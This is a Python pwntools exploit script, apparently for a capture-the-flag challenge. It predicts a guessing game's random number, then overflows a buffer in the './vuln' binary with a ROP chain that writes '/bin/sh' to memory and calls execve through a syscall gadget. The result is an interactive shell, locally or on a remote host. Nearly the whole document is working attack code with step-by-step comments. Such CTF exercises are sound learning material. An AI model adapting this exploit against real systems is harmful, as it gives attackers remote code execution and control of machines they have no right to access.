from pwn import *

binary = './vuln'

def get_random(n:int = 1)->int:
	with process('./guess') as helper:
		helper.sendline(str(n).encode())
		guess = int(helper.recvall().decode().strip())
	return (guess % 100) + 1

def get_gadget(rop:ROP,instructions:list[str])->int:
	try:
		gadget = rop.find_gadget(instructions)
		print(f"Gadget found at {hex(gadget.address)}")
		return gadget.address

	except AttributeError as error:
		print("Gadget not found :( ")
		return None




elf = ELF(binary , checksec=False)
rop = ROP(elf)

print("Type [y/n]:")
print("y -> server exploitation")
print("n -> local exploitation")
exploit = True if (input(">>>").lower() == 'y') else False

if(exploit):
	HOST = input("Enter Hostname:")
	PORT = input("Enter Port no:")
	io = remote(HOST,PORT)
else:
	io = process(binary)


print(io.recvuntil(b"What number would you like to guess?\n"))
print(f"Sending guessed number: {get_random()}")
io.sendline(str(get_random()).encode())
print(io.recvuntil(b"Congrats! You win! Your prize is this print statement!\n\n"))


# Step 1: Search for 'system'  in the binary.



"""
	But the binary doesn't have code for system. so we have to exploit the syscall instruction to call execve to run the shell.

	assembley for calling execve:

	execve("/bin/sh", 0, 0)

	mov rax, 59        ; syscall number for execve
	lea rdi, [rip+binsh] ; pointer to "/bin/sh"
	xor rsi, rsi       ; argv = 0
	xor rdx, rdx       ; envp = 0
	syscall
"""

# Step 2: Select the necessary ROP gadgets

"""
	ROP gadets
		1. pop rax ; ret
		2. pop rdx ; ret
		3. pop rdi ; ret
		4. mov qword ptr[rax + 8],rdx ; ret
		5. syscall ; ret

"""

shell_string = b"/bin/sh\x00"
syscall_num = 59 # syscall for execve
write_address = 0x00000000006b7000 # bss section address to store /bin/sh
pop_rax = get_gadget(rop,["pop rax","ret"])
pop_rsi = get_gadget(rop,["pop rsi","ret"])
pop_rdx = get_gadget(rop,["pop rdx","ret"])
pop_rdi = get_gadget(rop,["pop rdi","ret"])
syscall = get_gadget(rop,["syscall","ret"])
mov_string = 0x44cb94 #0x000000000044cb94 : mov qword ptr [rax + 8], rdx ; ret

# Step 3: Build ROP chain


ROP_chain = [
	p64(pop_rax),
	p64(write_address - 8),
	p64(pop_rdx),
	p64(u64(shell_string)),
	p64(mov_string),
	p64(pop_rdi),
	p64(write_address),
	p64(pop_rsi),
	p64(0),
	p64(pop_rdx),
	p64(0),
	p64(pop_rax),
	p64(syscall_num),
	p64(syscall)
]

payload = b'A' * 120

for ROP_gadget in ROP_chain:
	print(ROP_gadget)
	payload += ROP_gadget

payload += b'\n'

io.recvuntil(b"New winner!\nName? ")
io.sendline(payload)
io.interactive()
